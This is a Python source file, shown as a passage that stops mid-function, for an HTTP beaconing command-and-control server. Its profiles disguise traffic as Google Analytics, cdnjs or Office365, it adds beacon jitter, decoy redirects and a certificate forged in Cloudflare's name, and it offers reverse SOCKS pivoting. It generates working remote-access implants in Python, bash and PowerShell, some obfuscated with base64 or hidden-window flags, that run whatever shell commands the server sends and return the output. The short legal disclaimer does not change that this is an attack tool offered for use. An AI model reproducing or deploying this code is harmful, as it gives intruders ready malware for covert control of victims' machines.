"""
reverse_shell.py — HTTP/HTTPS Beaconing C2 Server
==================================================
Replaces the legacy raw-TCP reverse shell with an HTTP-based
beaconing model.  Agents check-in over HTTP/HTTPS, receive tasked
commands as JSON, execute them locally, and POST results back.

New in this revision
--------------------
* **Network Jitter** — agents sleep for a randomised window so all
  beacons don't land on a metronomic schedule that trips IDS rules.
  Formula: sleep = INTERVAL ± (INTERVAL × jitter_pct × uniform(-1,1))

* **Malleable Routing** — the Flask app exposes a single catch-all
  route.  Incoming requests are matched against a C2_PROFILES dict
  (like the google_analytics profile).  Only requests whose path AND
  User-Agent match the profile are processed; everything else gets a
  vanilla 302 redirect to a real CDN, making the server look like
  boring web infrastructure.

* **Payload Header Spoofing** — all generated payloads (Python, Bash,
  PowerShell) inject the User-Agent and Referer strings defined by the
  currently active C2 profile so that firewall logs see imitation
  browser traffic, not tool fingerprints.

The public class is still named ``ReverseShell`` so that
``c2_infrastructure.py`` and ``app.py`` import it unchanged.
A ``BeaconC2Server`` alias is also exported.

LEGAL DISCLAIMER
----------------
This software is for authorised penetration testing and security
research only.  Unauthorised use is illegal and unethical.
"""

from __future__ import annotations

import base64
import hashlib
import json
import jwt
import logging
import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import queue
import random
import re
import secrets
import ssl
import threading
import time
import textwrap
import uuid
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from wsgiref.simple_server import WSGIRequestHandler

from flask import Flask, request, jsonify, abort, redirect
from werkzeug.middleware.proxy_fix import ProxyFix

# ---------------------------------------------------------------------------
# Tuneable constants
# ---------------------------------------------------------------------------

BEACON_INTERVAL_S:  int   = 5          # expected agent poll-period (seconds)
DEFAULT_JITTER_PCT: float = 0.20       # ±20 % randomisation of sleep window
HEARTBEAT_TIMEOUT:  int   = 60         # seconds of silence before eviction
MAX_CMD_RESULTS:    int   = 200        # per-agent result log cap
AUTH_HEADER:        str   = "X-Agent-Token"

# ---------------------------------------------------------------------------
# Malleable C2 profiles
# ---------------------------------------------------------------------------
# Each profile defines:
#   register_path   — path agents POST to on first check-in
#   beacon_path     — path agents GET every interval for tasks
#   result_path     — path agents POST results back to
#   heartbeat_path  — lightweight keep-alive path (optional)
#   ua_regex        — compiled regex the incoming User-Agent MUST match
#   user_agent      — UA string injected into generated payloads
#   referer         — Referer string injected into generated payloads
#   decoy_redirect  — URL to send mismatched visitors to
# ---------------------------------------------------------------------------

C2_PROFILES: Dict[str, Dict[str, Any]] = {
    "google_analytics": {
        "register_path":  "/collect",
        "beacon_path":    "/collect",
        "result_path":    "/batch",
        "heartbeat_path": "/r/collect",
        "ua_regex":       re.compile(
            r"Mozilla/5\.0 \(Windows NT 10\.0.*?\) "
            r"AppleWebKit/537\.36.*?Chrome/",
            re.I,
        ),
        "user_agent":     (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "referer":        "https://www.google.com/",
        "decoy_redirect": "https://www.google.com/",
    },
    "cdn_js": {
        "register_path":  "/ajax/libs/init",
        "beacon_path":    "/ajax/libs/poll",
        "result_path":    "/ajax/libs/submit",
        "heartbeat_path": "/ajax/libs/ping",
        "ua_regex":       re.compile(
            r"Mozilla/5\.0.*?AppleWebKit", re.I
        ),
        "user_agent":     (
            "Mozilla/5.0 (X11; Linux x86_64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "referer":        "https://cdnjs.cloudflare.com/",
        "decoy_redirect": "https://cdnjs.cloudflare.com/",
    },
    "office365": {
        "register_path":  "/EWS/Exchange.asmx",
        "beacon_path":    "/owa/auth/owaauth.aspx",
        "result_path":    "/EWS/mrsproxy.svc",
        "heartbeat_path": "/owa/auth/15.1.2507/themes/resources/logon.css",
        "ua_regex":       re.compile(
            r"Microsoft Office|Outlook|Exchange", re.I
        ),
        "user_agent":     (
            "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0; Pro)"
        ),
        "referer":        "https://outlook.office365.com/",
        "decoy_redirect": "https://outlook.office365.com/",
    },
    "raw": {
        # Fallback — no UA check, obvious paths (used during dev/testing)
        "register_path":  "/agent/register",
        "beacon_path":    "/agent/beacon",
        "result_path":    "/agent/result",
        "heartbeat_path": "/agent/heartbeat",
        "ua_regex":       re.compile(r".*"),   # match everything
        "user_agent":     "NetScanGo/2.0",
        "referer":        "",
        "decoy_redirect": "https://www.example.com/",
    },
}


# ---------------------------------------------------------------------------
# Silent WSGIRequestHandler (suppresses HTTP log spam in the console)
# ---------------------------------------------------------------------------

class _SilentHandler(WSGIRequestHandler):
    def log_message(self, *args, **kwargs) -> None:  # type: ignore[override]
        pass


# ---------------------------------------------------------------------------
# BeaconC2Server  (public alias: ReverseShell)
# ---------------------------------------------------------------------------

class BeaconC2Server:
    """
    Embedded HTTP C2 beacon server.

    Public interface is identical to the old raw-TCP ``ReverseShell`` class
    so that ``C2Infrastructure`` and ``app.py`` require no modifications.

    active_connections schema (unchanged)
    -------------------------------------
    {
        conn_id: {
            "address":      (ip, port),     # agent reported IP + beacon port
            "connected_at": datetime,
            "last_activity": datetime,
            "agent_id":     str,
            "hostname":     str,
            "os_info":      str,
            "username":     str,
            "secret":       str,            # per-agent HMAC secret
        }
    }
    """

    def __init__(self) -> None:
        # ── public state (mirrors old ReverseShell) ──────────────────────
        self.active_connections: Dict[str, Dict[str, Any]] = {}
        self.listening: bool = False

        # ── malleable profile & jitter ────────────────────────────────────
        self.active_profile: str   = "google_analytics"  # default profile
        self.jitter_pct:    float  = DEFAULT_JITTER_PCT   # 0.0 = no jitter

        # ── TLS / SSL state ───────────────────────────────────────────────
        self._use_ssl:  bool          = False
        self._certfile: Optional[str] = None   # path to PEM cert
        self._keyfile:  Optional[str] = None   # path to PEM key

        # ── proxy-mode settings ──────────────────────────────────────────
        # When a CDN/Nginx sits in front of the beacon server it will send
        # X-Forwarded-For / X-Forwarded-Proto.  Enable ProxyFix so that
        # request.remote_addr resolves to the real agent IP, not the proxy.
        self._proxy_mode:    bool          = False  # enabled by set_proxy_secret()
        self._proxy_secret:  Optional[str] = None   # value of required X-C2-Secret header
        self._x_for_depth:   int           = 1      # how many proxies are in the chain
        # SocksBridge instance — created lazily by start_proxy()
        # Uses the correct "!BII" 9-byte frame layout (matches beacon/proxy.go)
        self._socks_bridge                 = None   # type: Optional[SocksBridge]

        # ── internal state ────────────────────────────────────────────────
        self._lock               = threading.RLock()
        self._task_queues:  Dict[str, queue.Queue] = {}   # conn_id → Queue[dict]
        self._result_store: Dict[str, List[dict]]  = {}   # conn_id → [result, …]
        self._server_thread: Optional[threading.Thread] = None
        self._flask_app:    Optional[Flask]         = None
        self._http_server                           = None  # WSGIServer
        self._host: str  = "0.0.0.0"
        self._port: int  = 8888    # beacon port (≠ main app port 5000)

        # ── logging ───────────────────────────────────────────────────────
        self.logger = logging.getLogger("beacon_c2")
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            os.makedirs("instance", exist_ok=True)
            fh  = logging.FileHandler("instance/beacon_c2.log")
            fmt = logging.Formatter(
                "%(asctime)s [%(levelname)s] %(name)s — %(message)s"
            )
            fh.setFormatter(fmt)
            self.logger.addHandler(fh)

    # ================================================================
    # Public interface (identical to old ReverseShell)
    # ================================================================

    def set_proxy_secret(
        self,
        secret: str,
        x_for_depth: int = 1,
    ) -> Tuple[bool, str]:
        """
        Enable CDN / reverse-proxy hardening.
        
        Once called, **every** incoming request must carry the header
        ``X-C2-Secret: <secret>`` or it is immediately dropped with a
        302 decoy redirect.  The CDN/Nginx is configured to inject this
        header server-side, so it never appears in agent payloads and
        cannot be guessed by direct-IP scanners.

        Simultaneously, ``ProxyFix`` is activated with the given
        ``x_for_depth`` so that ``request.remote_addr`` resolves to the
        real agent IP rather than the proxy's egress address.

        Parameters
        ----------
        secret      : Shared secret value the CDN injects into
                      ``X-C2-Secret``.  Use a long random UUID or token.
        x_for_depth : Number of proxy hops in the chain (default 1).
                      ``ProxyFix`` trusts only the last N entries in the
                      ``X-Forwarded-For`` list.

        Notes
        -----
        * Call this **before** ``start_listener``; changing these
          settings while the server is running has no effect until the
          next restart.
        * Set ``secret=""`` to disable the header guard while keeping
          ProxyFix active.
        """
        if not secret:
            return False, "Secret must be a non-empty string"
        self._proxy_secret = secret
        self._proxy_mode   = True
        self._x_for_depth  = max(1, int(x_for_depth))
        self.logger.info(
            "Proxy mode enabled  secret=<redacted>  x_for_depth=%d",
            self._x_for_depth,
        )
        return True, f"Proxy mode enabled  (x_for_depth={self._x_for_depth})"

    def start_proxy(
        self,
        conn_id: str,
        c2_reachable_host: str,
        ws_port: int = 8889,
        socks_port: int = 1080,
    ) -> Tuple[bool, str]:
        """
        Activate the Reverse SOCKS5 proxy for the specified agent.

        This method
        -----------
        1. Creates (or reuses) a ``SocksRouter`` and starts both
           the WebSocket tunnel server (``:ws_port``) and the local
           SOCKS5 server (``:socks_port``).
        2. Configures the router to route SOCKS5 traffic through
           the given agent.
        3. Queues a ``start_proxy`` task to the agent so it dials
           back on the WebSocket URL.
        
        Parameters
        ----------
        conn_id
            Agent ID (the ``agent_id`` returned at registration).
        c2_reachable_host
            The IP or hostname the *agent* can reach to connect to
            the WebSocket tunnel server.  This is typically the
            external / pivot address of the C2, NOT ``127.0.0.1``.
        ws_port
            The port the WebSocket tunnel server listens on (default 8889).
            Must be reachable by the agent.
        socks_port
            The local SOCKS5 port for the operator's browser/tools
            (default 1080, localhost-only).

        Returns
        -------
        Tuple[bool, str]
            ``(True, message)`` on success, ``(False, error)`` otherwise.

        Example
        -------
        ::

            # Operator wants to pivot through agent abc123 into the
            # target network.  The agent can reach the C2 on 10.0.0.5.
            ok, msg = c2.start_proxy(
                conn_id          = "abc123def456",
                c2_reachable_host = "10.0.0.5",
                ws_port          = 8889,
                socks_port       = 1080,
            )
            # Now configure Firefox:  SOCKS5 proxy → 127.0.0.1:1080
        """
        with self._lock:
            if conn_id not in self.active_connections:
                return False, f"Agent {conn_id!r} not found"
            if conn_id not in self._task_queues:
                self._task_queues[conn_id] = queue.Queue()

        # ── start (or reuse) the SocksBridge ─────────────────────────────────
        try:
            from .socks_bridge import SocksBridge  # lazy import (correct "!BII" layout)
        except ImportError:
            return False, (
                "socks_bridge module not found.  "
                "Make sure netscango/socks_bridge.py exists and "
                "'websockets' is installed (pip install websockets)."
            )

        if self._socks_bridge is None:
            self._socks_bridge = SocksBridge()

        if not self._socks_bridge.is_running:
            ok, msg = self._socks_bridge.start(
                ws_host    = "0.0.0.0",
                ws_port    = ws_port,
                socks_host = "127.0.0.1",
                socks_port = socks_port,
            )
            if not ok:
                return False, f"SocksBridge failed to start: {msg}"

        self._socks_bridge.set_active_agent(conn_id)

        # ── queue the start_proxy task to the agent ───────────────────────────
        ws_url = f"ws://{c2_reachable_host}:{ws_port}/tunnel/{conn_id}"
        task = {
            "task_id":   str(uuid.uuid4())[:8],
            "type":      "start_proxy",
            "command":   ws_url,      # the Go agent dials this URL
            "issued_at": datetime.now().isoformat(),
        }
        with self._lock:
            self._task_queues[conn_id].put(task)
            self.active_connections[conn_id]["last_activity"] = datetime.now()

        self.logger.info(
            "start_proxy queued for %s  ws_url=%s  socks_port=%d",
            conn_id, ws_url, socks_port,
        )
        return True, (
            f"Proxy task queued for agent {conn_id}  (task_id={task['task_id']})\n"
            f"  WebSocket  : {c2_reachable_host}:{ws_port}  (agent connects here)\n"
            f"  SOCKS5     : 127.0.0.1:{socks_port}         (point your browser here)\n"
            f"  WS URL     : {ws_url}"
        )

    def stop_proxy(self) -> Tuple[bool, str]:
        """
        Stop the SOCKS5 proxy and the WebSocket tunnel server.

        Existing circuits in flight will be closed abruptly (the Go agent
        will detect the WebSocket disconnect and clean up its end).
        """
        if self._socks_bridge is None or not self._socks_bridge.is_running:
            return False, "No active SOCKS5 proxy"

        ok, msg = self._socks_bridge.stop()
        self.logger.info("stop_proxy: %s", msg)
        return ok, msg

    def set_profile(self, profile_name: str) -> Tuple[bool, str]:
        """
        Switch the active malleable C2 profile.

        The profile controls which URL paths agents use and what
        User-Agent / Referer strings are embedded in generated payloads.

        Parameters
        ----------
        profile_name : str
            Key from ``C2_PROFILES``.  Available: google_analytics,
            cdn_js, office365, raw.
        """
        if profile_name not in C2_PROFILES:
            return False, f"Unknown profile '{profile_name}'. Available: {list(C2_PROFILES)}"
        self.active_profile = profile_name
        self.logger.info("C2 profile switched to '%s'", profile_name)
        return True, f"Active profile: {profile_name}"

    def set_jitter(self, jitter_pct: float) -> Tuple[bool, str]:
        """
        Set the beacon jitter percentage (0.0–1.0).

        With jitter_pct=0.20 and BEACON_INTERVAL_S=10 each sleep will
        be a random value in [8.0, 12.0] seconds.
        """
        jitter_pct = max(0.0, min(1.0, float(jitter_pct)))
        self.jitter_pct = jitter_pct
        return True, f"Jitter set to {jitter_pct * 100:.0f}%"

    def start_listener(
        self,
        host: str = "0.0.0.0",
        port: int = 8888,
        use_ssl: bool = False,
        certfile: Optional[str] = None,
        keyfile: Optional[str] = None,
    ) -> Tuple[bool, str]:
        """
        Start the beacon server (plain HTTP or TLS-wrapped HTTPS).

        Parameters
        ----------
        host     : Bind address (default all interfaces).
        port     : Beacon port.  The main Dash app uses 5000/8050;
                   choose a different port (e.g. 8888) to avoid conflicts.
        use_ssl  : If True, wrap the listening socket in TLS.  A
                   self-signed cert is auto-generated if no paths are given.
        certfile : Path to a PEM certificate file.  Auto-generated when
                   ``use_ssl=True`` and this is omitted.
        keyfile  : Path to a PEM private-key file.  Auto-generated when
                   ``use_ssl=True`` and this is omitted.
        """
        if self.listening:
            return False, "Beacon server already running"

        self._host     = host
        self._port     = port
        self._use_ssl  = use_ssl
        self._flask_app = self._build_flask_app()

        # ── build plain WSGI server ───────────────────────────────────────
        try:
            from wsgiref.simple_server import make_server as _make_server
            self._http_server = _make_server(
                host, port, self._flask_app, handler_class=_SilentHandler
            )
            self._http_server.timeout = 1.0   # allows clean shutdown
        except OSError as exc:
            return False, f"Cannot bind {host}:{port} — {exc}"

        # ── optionally upgrade socket to TLS ─────────────────────────────
        if use_ssl:
            # Resolve cert / key paths (auto-generate a self-signed pair if
            # the caller didn't supply explicit paths)
            if not certfile or not keyfile:
                try:
                    certfile, keyfile = self._generate_selfsigned_cert()
                except Exception as exc:
                    return False, f"TLS cert generation failed: {exc}"

            self._certfile = certfile
            self._keyfile  = keyfile

            try:
                ctx = self._build_ssl_context(certfile, keyfile)
                self._http_server.socket = ctx.wrap_socket(
                    self._http_server.socket,
                    server_side=True,
                )
            except Exception as exc:
                return False, f"TLS setup failed: {exc}"

        self.listening = True
        self._server_thread = threading.Thread(
            target=self._serve_forever,
            daemon=True,
            name="beacon-c2-server",
        )
        self._server_thread.start()

        scheme = "https" if use_ssl else "http"
        self.logger.info(
            "Beacon C2 started on %s:%d  scheme=%s  profile=%s  jitter=%.0f%%",
            host, port, scheme, self.active_profile, self.jitter_pct * 100,
        )
        return True, (
            f"Beacon C2 listening on {scheme}://{host}:{port}  "
            f"[profile={self.active_profile}, "
            f"tls={'on' if use_ssl else 'off'}, "
            f"jitter={self.jitter_pct*100:.0f}%]"
        )

    def stop_listener(self) -> Tuple[bool, str]:
        """Shut down the HTTP server and evict all agents."""
        if not self.listening:
            return False, "Beacon server not running"

        self.listening = False

        if self._http_server:
            self._http_server.shutdown()

        if self._server_thread and self._server_thread.is_alive():
            self._server_thread.join(timeout=5)

        with self._lock:
            self.active_connections.clear()
            self._task_queues.clear()
            self._result_store.clear()

        self.logger.info("Beacon C2 server stopped")
        return True, "Beacon server stopped"

    def execute_command(
        self, conn_id: str, command: str, task_type: str = "shell_cmd"
    ) -> Tuple[bool, str]:
        """
        Enqueue a command for the specified agent.

        The agent will receive the task on its next beacon poll.
        """
        with self._lock:
            if conn_id not in self.active_connections:
                return False, f"Agent {conn_id} not found"
            if conn_id not in self._task_queues:
                self._task_queues[conn_id] = queue.Queue()

            task = {
                "task_id":   str(uuid.uuid4())[:8],
                "type":      task_type,
                "command":   command,
                "issued_at": datetime.now().isoformat(),
            }
            self._task_queues[conn_id].put(task)
            self.active_connections[conn_id]["last_activity"] = datetime.now()

        self.logger.info("Command queued for %s: %r", conn_id, command)
        return True, f"Command queued (task {task['task_id']})"

    def close_connection(self, conn_id: str) -> Tuple[bool, str]:
        """Evict an agent record immediately."""
        with self._lock:
            if conn_id not in self.active_connections:
                return False, f"Agent {conn_id} not found"
            del self.active_connections[conn_id]
            self._task_queues.pop(conn_id, None)
            self._result_store.pop(conn_id, None)

        self.logger.info("Agent evicted: %s", conn_id)
        return True, f"Agent {conn_id} removed"

    def get_active_connections(self) -> List[Dict[str, Any]]:
        """Return serialisable list of active agents."""
        with self._lock:
            out = []
            for conn_id, info in self.active_connections.items():
                out.append({
                    "id":           conn_id,
                    "address":      f"{info['address'][0]}:{info['address'][1]}",
                    "connected_at": info["connected_at"].strftime("%Y-%m-%d %H:%M:%S"),
                    "last_activity":info["last_activity"].strftime("%Y-%m-%d %H:%M:%S"),
                    "hostname":     info.get("hostname", "unknown"),
                    "os_info":      info.get("os_info", "unknown"),
                    "username":     info.get("username", "unknown"),
                })
            return out

    def get_agent_results(self, conn_id: str) -> List[Dict[str, Any]]:
        """Return all command results collected for a specific agent."""
        with self._lock:
            return list(self._result_store.get(conn_id, []))

    # ================================================================
    # Payload generation
    # ================================================================

    def generate_payload(
        self,
        host: str,
        port: int = 8888,
        shell_type: str = "python",
        jitter_pct: Optional[float] = None,
        profile: Optional[str] = None,
    ) -> str:
        """
        Generate an agent payload that beacons back to this server.

        Parameters
        ----------
        host        : C2 server IP / hostname reachable by the target.
        port        : Beacon port (must match ``start_listener`` port).
        shell_type  : One of ``python``, ``python3``, ``powershell``,
                      ``bash``, ``python_b64``.
        jitter_pct  : Override instance jitter (0.0–1.0).  None = use
                      the value set by ``set_jitter()``.
        profile     : Override active profile name.  None = use
                      ``self.active_profile``.

        Returns
        -------
        str
            A one-liner (or short script) ready to paste / deliver.
        """
        scheme      = "https" if self._use_ssl else "http"
        c2_url      = f"{scheme}://{host}:{port}"
        jitter_pct  = jitter_pct if jitter_pct is not None else self.jitter_pct
        profile_key = profile or self.active_profile
        prof        = C2_PROFILES.get(profile_key, C2_PROFILES["google_analytics"])

        generators = {
            "python":      self._payload_python,
            "python3":     self._payload_python,
            "powershell":  self._payload_powershell,
            "bash":        self._payload_bash_curl,
            "python_b64":  self._payload_python_b64,
        }
        gen = generators.get(shell_type, self._payload_python)
        return gen(c2_url, jitter_pct, prof, self._use_ssl)

    # ── payload templates ─────────────────────────────────────────────

    def _payload_python(
        self,
        c2_url: str,
        jitter_pct: float = DEFAULT_JITTER_PCT,
        prof: Optional[Dict[str, Any]] = None,
        use_ssl: bool = False,
    ) -> str:
        """
        Full Python beaconing agent with jitter + UA spoofing.
        Runs on Python 2.7+ and Python 3; delivered as a base64 one-liner.
        """
        prof = prof or C2_PROFILES["google_analytics"]
        ua          = prof["user_agent"]
        referer     = prof["referer"]
        reg_path    = prof["register_path"]
        beacon_path = prof["beacon_path"]
        result_path = prof["result_path"]
        # TLS flag baked into the payload so the agent can disable cert verification
        ssl_flag    = "True" if use_ssl else "False"

        script = textwrap.dedent(f"""\
            import os,sys,time,socket,platform,subprocess,random,ssl
            try:
                from urllib.request import urlopen,Request,build_opener,HTTPSHandler
                from urllib.error import URLError
            except ImportError:
                from urllib2 import urlopen,Request,HTTPSHandler,build_opener,URLError
            import json as _j

            USE_SSL={ssl_flag}
            if USE_SSL:
                _ctx=ssl.create_default_context()
                _ctx.check_hostname=False
                _ctx.verify_mode=ssl.CERT_NONE
                _opener=build_opener(HTTPSHandler(context=_ctx))
            else:
                _opener=build_opener()

            C2='{c2_url}'
            INTERVAL={BEACON_INTERVAL_S}
            JITTER={jitter_pct}
            UA='{ua}'
            REFERER='{referer}'

            def _jitter_sleep():
                delta=INTERVAL*JITTER*random.uniform(-1,1)
                time.sleep(max(0.5,INTERVAL+delta))

            def _hdrs(extra=None):
                h={{'User-Agent':UA,'Referer':REFERER,'Content-Type':'application/json'}}
                if extra:
                    h.update(extra)
                return h

            def _post(url,data):
                raw=_j.dumps(data).encode()
                req=Request(url,data=raw,headers=_hdrs())
                try:
                    resp=_opener.open(req,timeout=10)
                    return _j.loads(resp.read())
                except:
                    return {{}}

            def _get(url):
                try:
                    req=Request(url,headers=_hdrs())
                    resp=_opener.open(req,timeout=10)
                    if resp.getcode()==200:
                        return _j.loads(resp.read())
                    return None
                except:
                    return None

            reg=_post(C2+'{reg_path}',{{
                'hostname':socket.gethostname(),
                'os_info':platform.platform(),
                'username':os.environ.get('USER',os.environ.get('USERNAME','unknown')),
                'ip':socket.gethostbyname(socket.gethostname()),
            }})
            aid=reg.get('agent_id','')
            tok=reg.get('token','')
            if not aid:
                sys.exit(1)

            while True:
                try:
                    task=_get(C2+'{beacon_path}?token='+tok+'&aid='+aid)
                    if task and task.get('command'):
                        cmd=task['command']
                        tid=task.get('task_id','')
                        try:
                            out=subprocess.check_output(cmd,shell=True,
                                stderr=subprocess.STDOUT,timeout=30).decode(errors='replace')
                        except subprocess.CalledProcessError as e:
                            out=e.output.decode(errors='replace')
                        except Exception as e:
                            out=str(e)
                        _post(C2+'{result_path}',{{
                            'task_id':tid,'command':cmd,'output':out,'token':tok,'aid':aid
                        }})
                except:
                    pass
                _jitter_sleep()
        """)
        b64 = base64.b64encode(script.encode()).decode()
        return (
            f"python -c \"import base64; exec(base64.b64decode('{b64}').decode())\""
        )

    def _payload_python_b64(
        self,
        c2_url: str,
        jitter_pct: float = DEFAULT_JITTER_PCT,
        prof: Optional[Dict[str, Any]] = None,
        use_ssl: bool = False,
    ) -> str:
        """Same as _payload_python but forced through python3."""
        inner     = self._payload_python(c2_url, jitter_pct, prof, use_ssl)
        b64_inner = base64.b64encode(inner.encode()).decode()
        return (
            f"python3 -c \"import base64; exec(base64.b64decode('{b64_inner}').decode())\""
        )

    def _payload_bash_curl(
        self,
        c2_url: str,
        jitter_pct: float = DEFAULT_JITTER_PCT,
        prof: Optional[Dict[str, Any]] = None,
        use_ssl: bool = False,
    ) -> str:
        """
        Bash + curl beacon agent with jitter and spoofed headers.
        Requires bash, curl, python3 (for JSON parsing).
        """
        # -k / --insecure makes curl skip cert validation for self-signed certs
        curl_ssl = "-k" if use_ssl else ""
        prof = prof or C2_PROFILES["google_analytics"]
        ua          = prof["user_agent"]
        referer     = prof["referer"]
        reg_path    = prof["register_path"]
        beacon_path = prof["beacon_path"]
        result_path = prof["result_path"]
        j_pct       = jitter_pct

        return textwrap.dedent(f"""\
            bash -c '
            C2="{c2_url}"
            INTERVAL={BEACON_INTERVAL_S}
            JITTER={j_pct}
            UA="{ua}"
            REF="{referer}"

            jitter_sleep() {{
                DELTA=$(python3 -c "import random; print(max(0.5,{BEACON_INTERVAL_S}+{BEACON_INTERVAL_S}*$JITTER*random.uniform(-1,1)))")
                sleep $DELTA
            }}

            HN=$(hostname); OS=$(uname -a); UN=$(whoami)
            IP=$(hostname -I 2>/dev/null | awk "{{print $1}}")
            REG=$(curl -s {curl_ssl} -X POST "$C2{reg_path}" \\
                -H "Content-Type: application/json" \\
                -H "User-Agent: $UA" \\
                -H "Referer: $REF" \\
                -d "{{\\"hostname\\":\\"$HN\\",\\"os_info\\":\\"$OS\\",\\"username\\":\\"$UN\\",\\"ip\\":\\"$IP\\"}}")
            AID=$(echo $REG | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\\"agent_id\\",\\"\\"))")
            TOK=$(echo $REG | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\\"token\\",\\"\\"))")
            [ -z "$AID" ] && exit 1

            while true; do
                TASK=$(curl -s {curl_ssl} \\
                    -H "User-Agent: $UA" -H "Referer: $REF" \\
                    "$C2{beacon_path}?token=$TOK&aid=$AID")
                CMD=$(echo $TASK | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\\"command\\",\\"\\"))" 2>/dev/null)
                TID=$(echo $TASK | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\\"task_id\\",\\"\\"))" 2>/dev/null)
                if [ -n "$CMD" ]; then
                    OUT=$(eval "$CMD" 2>&1)
                    curl -s {curl_ssl} -X POST "$C2{result_path}" \\
                        -H "Content-Type: application/json" \\
                        -H "User-Agent: $UA" -H "Referer: $REF" \\
                        -d "{{\\"task_id\\":\\"$TID\\",\\"command\\":\\"$CMD\\",\\"output\\":\\"$(echo $OUT | head -c 4096)\\",\\"token\\":\\"$TOK\\",\\"aid\\":\\"$AID\\"}}"      
                fi
                jitter_sleep
            done'
        """).strip()

    def _payload_powershell(
        self,
        c2_url: str,
        jitter_pct: float = DEFAULT_JITTER_PCT,
        prof: Optional[Dict[str, Any]] = None,
        use_ssl: bool = False,
    ) -> str:
        """PowerShell beaconing agent for Windows with jitter, UA spoofing, and optional TLS."""
        prof = prof or C2_PROFILES["google_analytics"]
        ua          = prof["user_agent"]
        referer     = prof["referer"]
        reg_path    = prof["register_path"]
        beacon_path = prof["beacon_path"]
        result_path = prof["result_path"]

        # PowerShell: skip TLS validation for self-signed certs
        # PS 5.x needs the callback hack; PS 6+ supports -SkipCertificateCheck
        ps_tls_bypass = (
            "[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}\n"
            "[Net.ServicePointManager]::SecurityProtocol = "
            "[Net.SecurityProtocolType]::Tls12"
        ) if use_ssl else ""
        ps_skip_cert  = "-SkipCertificateCheck" if use_ssl else ""

        ps_script = textwrap.dedent(f"""\
            {ps_tls_bypass}
            $C2       = '{c2_url}'
            $INTERVAL = {BEACON_INTERVAL_S}
            $JITTER   = {jitter_pct}
            $UA       = '{ua}'
            $REF      = '{referer}'

            function Invoke-JitterSleep {{
                $delta = $INTERVAL * $JITTER * (Get-Random -Minimum -100 -Maximum 100) / 100
                $sleep = [Math]::Max(0.5, $INTERVAL + $delta)
                Start-Sleep -Seconds $sleep
            }}

            $headers = @{{
                'User-Agent' = $UA
                'Referer'    = $REF
            }}

            $HN = $env:COMPUTERNAME
            $OS = (Get-WmiObject Win32_OperatingSystem).Caption
            $UN = $env:USERNAME
            $IP = (Get-NetIPAddress -AddressFamily IPv4 |
                   Where-Object {{ $_.IPAddress -ne '127.0.0.1' }} |
                   Select-Object -First 1).IPAddress

            $body = @{{hostname=$HN; os_info=$OS; username=$UN; ip=$IP}} | ConvertTo-Json
            $reg  = Invoke-RestMethod -Uri "$C2{reg_path}" -Method Post `
                        -Body $body -ContentType 'application/json' `
                        -Headers $headers {ps_skip_cert}
            $AID  = $reg.agent_id
            $TOK  = $reg.token
            if (-not $AID) {{ exit 1 }}

            while ($true) {{
                try {{
                    $task = Invoke-RestMethod `
                        -Uri "$C2{beacon_path}?token=$TOK&aid=$AID" `
                        -Method Get -Headers $headers {ps_skip_cert} -ErrorAction Stop
                    if ($task.command) {{
                        $CMD = $task.command
                        $TID = $task.task_id
                        try   {{ $OUT = (cmd /c $CMD 2>&1) -join "`n" }}
                        catch {{ $OUT = $_.Exception.Message }}
                        $res = @{{task_id=$TID; command=$CMD; output=$OUT; token=$TOK; aid=$AID}} | ConvertTo-Json
                        Invoke-RestMethod -Uri "$C2{result_path}" `
                            -Method Post -Body $res `
                            -ContentType 'application/json' `
                            -Headers $headers {ps_skip_cert}
                    }}
                }} catch {{}}
                Invoke-JitterSleep
            }}
        """)
        b64 = base64.b64encode(ps_script.encode("utf-16-le")).decode()
        return f"powershell.exe -NoP -NonI -W Hidden -Enc {b64}"

    # ================================================================
    # TLS / SSL helpers
    # ================================================================

    def _generate_selfsigned_cert(self) -> Tuple[str, str]:
        """
        Generate a self-signed TLS certificate and private key, saving
        both to ``instance/`` as PEM files.

        The certificate Subject uses a plausible CDN identity
        (``cdn.cloudflare.net``) so that a casual inspection of the cert
        does not immediately reveal C2 infrastructure.

        Resolution order
        ----------------
        1. Return existing files immediately (avoids regeneration on restart).
        2. Use the ``cryptography`` library if available — pure-Python,
           no external tools required.
        3. Fall back to an ``openssl`` subprocess if ``cryptography`` is
           not installed.

        Returns
        -------
        (cert_path, key_path) : Tuple[str, str]
        """
        os.makedirs("instance", exist_ok=True)
        cert_path = os.path.join("instance", "c2_cert.pem")
        key_path  = os.path.join("instance", "c2_key.pem")

        # Return cached files to avoid needless regeneration
        if os.path.exists(cert_path) and os.path.exists(key_path):
            self.logger.info("Reusing existing TLS cert: %s", cert_path)
            return cert_path, key_path

        # ── attempt 1: cryptography library ──────────────────────────────
        try:
            import datetime as _dt
            from cryptography                          import x509
            from cryptography.x509.oid                import NameOID
            from cryptography.hazmat.primitives       import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa

            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME,        "cdn.cloudflare.net"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME,  "Cloudflare, Inc."),
                x509.NameAttribute(NameOID.COUNTRY_NAME,       "US"),
            ])
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(_dt.datetime.utcnow())
                .not_valid_after(_dt.datetime.utcnow() + _dt.timedelta(days=825))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName("cdn.cloudflare.net"),
                        x509.DNSName("localhost"),
                    ]),
                    critical=False,
                )
                .sign(key, hashes.SHA256())
            )

            with open(cert_path, "wb") as fh:
                fh.write(cert.public_bytes(serialization.Encoding.PEM))
            with open(key_path, "wb") as fh:
                fh.write(key.private_bytes(
